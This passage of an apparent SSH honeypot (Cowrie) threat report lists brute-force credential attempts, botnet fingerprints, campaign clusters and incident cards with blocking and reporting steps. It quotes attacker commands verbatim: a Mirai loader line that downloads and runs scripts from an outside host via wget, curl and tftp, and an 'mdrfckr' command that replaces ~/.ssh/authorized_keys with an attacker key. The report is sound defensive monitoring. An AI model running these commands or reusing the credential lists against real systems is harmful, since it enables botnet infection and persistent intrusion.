| `admin` | `3245gs5662d34` | `175.198.62.180` | 2026-09-19T20:38:17 |
| `admin` | `hadoop12345678` | `101.47.15.26` | 2026-09-19T20:38:17 |
| `345gs5662d34` | `345gs5662d34` | `101.47.15.26` | 2026-09-19T20:38:21 |
| `admin` | `3245gs5662d34` | `101.47.15.26` | 2026-09-19T20:38:23 |
| `root` | `sol2024` | `10.0.0.73` | 2026-09-19T20:38:53 |
| `root` | `Aa1234567` | `10.0.0.73` | 2026-09-19T20:39:23 |
| `panel` | `panel` | `195.178.110.218` | 2026-09-19T20:39:26 |
| `sftp_user` | `sftp_user` | `213.194.128.58` | 2026-09-19T20:40:03 |
| `345gs5662d34` | `345gs5662d34` | `213.194.128.58` | 2026-09-19T20:40:06 |
| `sftp_user` | `3245gs5662d34` | `213.194.128.58` | 2026-09-19T20:40:07 |
| `root` | `info1234` | `10.0.0.73` | 2026-09-19T20:40:47 |
| `hive` | `hive` | `195.178.110.218` | 2026-09-19T20:41:06 |
| `root` | `1qazXSW2` | `10.0.0.73` | 2026-09-19T20:41:20 |
| `root` | `!root` | `2.57.122.168` | 2026-09-19T20:41:52 |
| `root` | `user01` | `10.0.0.73` | 2026-09-19T20:42:35 |
| `azureuser` | `azureuser` | `195.178.110.218` | 2026-09-19T20:42:41 |
| `root` | `1q2w3e4r5t!` | `10.0.0.73` | 2026-09-19T20:43:19 |
| `root` | `111111` | `2.57.122.168` | 2026-09-19T20:43:49 |
| `awsiam` | `awsiam` | `195.178.110.218` | 2026-09-19T20:44:16 |
| `root` | `A1b2c3` | `10.0.0.73` | 2026-09-19T20:44:24 |
| `root` | `Tk123456` | `201.63.223.138` | 2026-09-19T20:44:33 |
| `345gs5662d34` | `345gs5662d34` | `201.63.223.138` | 2026-09-19T20:44:36 |
| `root` | `3245gs5662d34` | `201.63.223.138` | 2026-09-19T20:44:37 |
| `scptest` | `scptest` | `189.167.225.202` | 2026-09-19T20:44:55 |
| `345gs5662d34` | `345gs5662d34` | `189.167.225.202` | 2026-09-19T20:44:57 |
| `scptest` | `3245gs5662d34` | `189.167.225.202` | 2026-09-19T20:44:57 |
| `root` | `123qwe#` | `10.0.0.73` | 2026-09-19T20:45:17 |
| `root` | `123123` | `2.57.122.168` | 2026-09-19T20:45:41 |
| `astra` | `astra` | `195.178.110.218` | 2026-09-19T20:45:53 |
| `root` | `admin1234!` | `10.0.0.73` | 2026-09-19T20:46:14 |
| `titu` | `Ahgf3487@rtjhskl854hd47893@#a4nC` | `93.99.104.96` | 2026-09-19T20:46:31 |
| `345gs5662d34` | `345gs5662d34` | `93.99.104.96` | 2026-09-19T20:46:33 |
| `titu` | `3245gs5662d34` | `93.99.104.96` | 2026-09-19T20:46:34 |
| `root` | `1234qwer!@#$QWER` | `10.0.0.73` | 2026-09-19T20:47:16 |
| `root` | `rootroot` | `195.178.110.218` | 2026-09-19T20:47:28 |
| `root` | `1234` | `2.57.122.168` | 2026-09-19T20:47:36 |
| `root` | ``1qaz2wsx` | `10.0.0.73` | 2026-09-19T20:48:04 |
| `bigdata` | `bigdata` | `195.178.110.218` | 2026-09-19T20:48:59 |
| `root` | `1234Qwer` | `10.0.0.73` | 2026-09-19T20:49:12 |
| `root` | `12345` | `2.57.122.168` | 2026-09-19T20:49:32 |
| `root` | `root2025@` | `10.0.0.73` | 2026-09-19T20:49:52 |
| `student` | `student` | `195.178.110.218` | 2026-09-19T20:50:30 |
| `root` | `1234@qwer` | `10.0.0.73` | 2026-09-19T20:51:17 |
| `teacher` | `teacher` | `195.178.110.218` | 2026-09-19T20:52:05 |
| `root` | `zxc123!@#` | `10.0.0.73` | 2026-09-19T20:53:12 |
| `root` | `12345678` | `2.57.122.168` | 2026-09-19T20:53:28 |
| `root` | `qwer@123` | `10.0.0.73` | 2026-09-19T20:53:34 |
| `teachers` | `teachers` | `195.178.110.218` | 2026-09-19T20:53:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **255** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 83 |
| libssh | 69 |
| OpenSSH | 9 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 62 | 22 |
| `16443846184e...` | Generic scanner | 56 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 2 |
| `390ffe68a68c...` | Modern SSH client | 6 | 2 |
| `4e066189c3bb...` | Generic scanner | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 62 | 22 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 56 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 5 | — |
| `390ffe68a68c...` | OpenSSH | 6 | 2 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **5** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 8 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 7 | 2 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 21 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `92.118.39.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/handshakebins.sh; busybox wget http://213.232.114.14/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `23.94.206.233`, `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **45** |
| High-Risk ASNs | **34** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 23 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS135905` | VIETNAM POSTS AND TELECOMMUNICATIONS GROUP | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (143)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-30f82b067ce8

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-19 17:00 |
| **Last Seen** | 2026-09-19 17:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:00:48` | `cowrie.session.connect` |
| `2026-09-19 17:00:49` | `cowrie.login.success` |
| `2026-09-19 17:00:49` | `cowrie.session.params` |
| `2026-09-19 17:00:51` | `cowrie.command.input` |
| `2026-09-19 17:00:51` | `cowrie.command.input` |
| `2026-09-19 17:00:51` | `cowrie.session.file_download` |
| `2026-09-19 17:00:51` | `cowrie.session.file_download` |
| `2026-09-19 17:00:51` | `cowrie.session.file_download` |
| `2026-09-19 17:00:51` | `cowrie.session.file_download` |
| `2026-09-19 17:00:51` | `cowrie.session.file_download.failed` |
| `2026-09-19 17:00:52` | `cowrie.session.file_download` |
| `2026-09-19 17:00:52` | `cowrie.session.file_download` |
| `2026-09-19 17:01:06` | `cowrie.log.closed` |
| `2026-09-19 17:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f4007991df

| Field | Detail |
|---|---|
| **Source IP** | `101.36.119[.]203` |
| **First Seen** | 2026-09-19 17:26 |
| **Last Seen** | 2026-09-19 17:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:26:22` | `cowrie.session.connect` |
| `2026-09-19 17:26:22` | `cowrie.client.version` |
| `2026-09-19 17:26:22` | `cowrie.client.kex` |
| `2026-09-19 17:26:23` | `cowrie.login.success` |
| `2026-09-19 17:26:24` | `cowrie.session.params` |
| `2026-09-19 17:26:24` | `cowrie.command.input` |
| `2026-09-19 17:26:24` | `cowrie.command.failed` |
| `2026-09-19 17:26:24` | `cowrie.log.closed` |
| `2026-09-19 17:26:25` | `cowrie.session.params` |
| `2026-09-19 17:26:25` | `cowrie.command.input` |
| `2026-09-19 17:26:26` | `cowrie.session.file_download` |
| `2026-09-19 17:26:26` | `cowrie.log.closed` |
| `2026-09-19 17:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.119[.]203` to AbuseIPDB if not already reported
- [ ] Block `101.36.119[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4439363bce

| Field | Detail |
|---|---|
| **Source IP** | `101.36.119[.]203` |
| **First Seen** | 2026-09-19 17:26 |
| **Last Seen** | 2026-09-19 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:26:26` | `cowrie.session.connect` |
| `2026-09-19 17:26:26` | `cowrie.client.version` |
| `2026-09-19 17:26:26` | `cowrie.client.kex` |
| `2026-09-19 17:26:27` | `cowrie.login.success` |
| `2026-09-19 17:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.119[.]203` to AbuseIPDB if not already reported
- [ ] Block `101.36.119[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbfdf748385e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.119[.]203` |
| **First Seen** | 2026-09-19 17:26 |
| **Last Seen** | 2026-09-19 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:26:27` | `cowrie.session.connect` |
| `2026-09-19 17:26:27` | `cowrie.client.version` |
| `2026-09-19 17:26:28` | `cowrie.client.kex` |
| `2026-09-19 17:26:29` | `cowrie.login.success` |
| `2026-09-19 17:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.119[.]203` to AbuseIPDB if not already reported
- [ ] Block `101.36.119[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6908161cff1c

| Field | Detail |
|---|---|
| **Source IP** | `106.251.244[.]178` |
| **First Seen** | 2026-09-19 17:40 |
| **Last Seen** | 2026-09-19 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:40:19` | `cowrie.session.connect` |
| `2026-09-19 17:40:19` | `cowrie.client.version` |
| `2026-09-19 17:40:19` | `cowrie.client.kex` |
| `2026-09-19 17:40:20` | `cowrie.login.success` |
| `2026-09-19 17:40:21` | `cowrie.session.params` |
| `2026-09-19 17:40:21` | `cowrie.command.input` |
| `2026-09-19 17:40:21` | `cowrie.command.failed` |
| `2026-09-19 17:40:21` | `cowrie.log.closed` |
| `2026-09-19 17:40:22` | `cowrie.session.params` |
| `2026-09-19 17:40:22` | `cowrie.command.input` |
| `2026-09-19 17:40:22` | `cowrie.session.file_download` |
| `2026-09-19 17:40:22` | `cowrie.log.closed` |
| `2026-09-19 17:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.251.244[.]178` to AbuseIPDB if not already reported
- [ ] Block `106.251.244[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239fa19e3550

| Field | Detail |
|---|---|
| **Source IP** | `106.251.244[.]178` |
| **First Seen** | 2026-09-19 17:40 |
| **Last Seen** | 2026-09-19 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:40:22` | `cowrie.session.connect` |
| `2026-09-19 17:40:22` | `cowrie.client.version` |
| `2026-09-19 17:40:23` | `cowrie.client.kex` |
| `2026-09-19 17:40:23` | `cowrie.login.success` |
| `2026-09-19 17:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.251.244[.]178` to AbuseIPDB if not already reported
- [ ] Block `106.251.244[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b028c06fca5

| Field | Detail |
|---|---|
| **Source IP** | `106.251.244[.]178` |
| **First Seen** | 2026-09-19 17:40 |
| **Last Seen** | 2026-09-19 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:40:24` | `cowrie.session.connect` |
| `2026-09-19 17:40:24` | `cowrie.client.version` |
| `2026-09-19 17:40:24` | `cowrie.client.kex` |
| `2026-09-19 17:40:25` | `cowrie.login.success` |
| `2026-09-19 17:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.251.244[.]178` to AbuseIPDB if not already reported
- [ ] Block `106.251.244[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902a84f29a39

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-19 17:41 |
| **Last Seen** | 2026-09-19 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:41:18` | `cowrie.session.connect` |
| `2026-09-19 17:41:18` | `cowrie.client.version` |
| `2026-09-19 17:41:18` | `cowrie.client.kex` |
| `2026-09-19 17:41:19` | `cowrie.login.success` |
| `2026-09-19 17:41:19` | `cowrie.direct-tcpip.request` |
| `2026-09-19 17:41:19` | `cowrie.direct-tcpip.data` |
| `2026-09-19 17:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d900ab63f9

| Field | Detail |
|---|---|
| **Source IP** | `211.75.198[.]217` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:23` | `cowrie.session.connect` |
| `2026-09-19 17:45:23` | `cowrie.client.version` |
| `2026-09-19 17:45:23` | `cowrie.client.kex` |
| `2026-09-19 17:45:24` | `cowrie.login.success` |
| `2026-09-19 17:45:25` | `cowrie.session.params` |
| `2026-09-19 17:45:25` | `cowrie.command.input` |
| `2026-09-19 17:45:25` | `cowrie.command.failed` |
| `2026-09-19 17:45:26` | `cowrie.log.closed` |
| `2026-09-19 17:45:26` | `cowrie.session.params` |
| `2026-09-19 17:45:26` | `cowrie.command.input` |
| `2026-09-19 17:45:27` | `cowrie.session.file_download` |
| `2026-09-19 17:45:27` | `cowrie.log.closed` |
| `2026-09-19 17:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.75.198[.]217` to AbuseIPDB if not already reported
- [ ] Block `211.75.198[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d94b565aa13

| Field | Detail |
|---|---|
| **Source IP** | `211.75.198[.]217` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:27` | `cowrie.session.connect` |
| `2026-09-19 17:45:27` | `cowrie.client.version` |
| `2026-09-19 17:45:27` | `cowrie.client.kex` |
| `2026-09-19 17:45:28` | `cowrie.login.success` |
| `2026-09-19 17:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.75.198[.]217` to AbuseIPDB if not already reported
- [ ] Block `211.75.198[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a24bd98a42

| Field | Detail |
|---|---|
| **Source IP** | `211.75.198[.]217` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:28` | `cowrie.session.connect` |
| `2026-09-19 17:45:28` | `cowrie.client.version` |
| `2026-09-19 17:45:28` | `cowrie.client.kex` |
| `2026-09-19 17:45:29` | `cowrie.login.success` |
| `2026-09-19 17:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.75.198[.]217` to AbuseIPDB if not already reported
- [ ] Block `211.75.198[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e3b395f4a1

| Field | Detail |
|---|---|
| **Source IP** | `82.77.62[.]250` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:51` | `cowrie.session.connect` |
| `2026-09-19 17:45:51` | `cowrie.client.version` |
| `2026-09-19 17:45:51` | `cowrie.client.kex` |
| `2026-09-19 17:45:52` | `cowrie.login.success` |
| `2026-09-19 17:45:52` | `cowrie.session.params` |
| `2026-09-19 17:45:52` | `cowrie.command.input` |
| `2026-09-19 17:45:52` | `cowrie.command.failed` |
| `2026-09-19 17:45:53` | `cowrie.log.closed` |
| `2026-09-19 17:45:53` | `cowrie.session.params` |
| `2026-09-19 17:45:53` | `cowrie.command.input` |
| `2026-09-19 17:45:54` | `cowrie.session.file_download` |
| `2026-09-19 17:45:54` | `cowrie.log.closed` |
| `2026-09-19 17:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.77.62[.]250` to AbuseIPDB if not already reported
- [ ] Block `82.77.62[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad2c9eaf5f1

| Field | Detail |
|---|---|
| **Source IP** | `82.77.62[.]250` |
| **First Seen** | 2026-09-19 17:45 |
| **Last Seen** | 2026-09-19 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 17:45:54` | `cowrie.session.connect` |
| `2026-09-19 17:45:54` | `cowrie.client.version` |
| `2026-09-19 17:45:54` | `cowrie.client.kex` |
| `2026-09-19 17:45:54` | `cowrie.login.success` |
| `2026-09-19 17:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.77.62[.]250` to AbuseIPDB if not already reported
- [ ] Block `82.77.62[.]250` at perimeter firewall / security group
